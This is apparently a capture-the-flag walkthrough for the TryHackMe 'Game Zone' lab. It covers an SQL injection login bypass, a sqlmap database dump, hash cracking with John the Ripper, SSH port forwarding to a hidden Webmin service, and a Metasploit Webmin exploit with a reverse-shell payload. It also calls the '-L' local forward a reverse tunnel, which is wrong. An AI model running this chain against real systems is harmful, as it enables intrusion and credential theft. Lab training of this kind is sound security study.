# Room
https://tryhackme.com/room/gamezone

# Task 1 - Deploy
Deploy VM

# Task 2 - Obtain SQLi
SQL is a standard language for storing, editing, and retrieving data in databases.  Use a basic SQLi to bypass login and view the form you are forwarded to

* Resources
  * https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

# Task 3 - Using sqlmap
Load up Burp Suite.  In the form you were forwarded to above, capture a test request and submit.  Save the request to a text file.  Use sqlmap with the saved Burp request

```
sqlmap -r r.txt --dbms=mysql --dump 
```

# Task 4 - Cracking the password
From the sqlmap command above a database dump is provided.  Inside is a password hash for a user.  Use John the Ripper to crack the hash

* Copy hash to text file
```
echo "hash_here" > hash
```
* ID the hash using Name That Hash
  * https://github.com/HashPals/Name-That-Hash
```
nth -f hash
```
* Use john to crack the hash
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 
```
* Login with the user you found earlier in the sqlmap dump and the cracked password, grab the user flag

# Task 5 - Reverse SSH tunnels
* Once logged into the machine using the creds from above, use the ss tool to list sockets running on the host
```
ss -tulpn
```
* When you find an interesting service that isn't allowed access from the public, you can use reverse SSH tunnels to connect
  * example: ssh -L 1234:localhost:9000 user@example
    * -L - tells SSH To tunnel back from the remote host to you
    * 1234 - this is the local port to access
    * localhost - this is the remote host to access, doesn't have to be the same as user@example
    * 9000 - this is the port listening on the remote host that may or may not be allowed access from the public
    * user@example - this is the normal SSH login to the remote host
* Create a reverse SSH tunnel using one of the service ports you discovered with ss -tulpn
```
ssh -L 1234:localhost:10000 agent47@10.10.172.187
```
* Run nmap against localhost with port 1234 to gain information on the remote service that is running

# Task 6 - Privilege Escalation
Use metasploit to take advantage of the service
```
msfconsole

msf6 > search webmin 1.580
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost tun0
lhost => tun0
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhost localhost
rhost => localhost
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rport 1234
rport => 1234
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set ssl false
[!] Changing the SSL option's value may require changing RPORT!                                                                                                                                            
ssl => false         
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show payloads 
...
...
...
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload 5  
payload => cmd/unix/reverse 
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set username username_found_above
username => username_found_above      
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set password password_found_above
password => password_found_above 
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > run

[*] Started reverse TCP double handler on a.b.c.d:4444 
[*] Attempting to login...        
[+] Authentication successful               
[+] Authentication successful      
```
* Grab the flag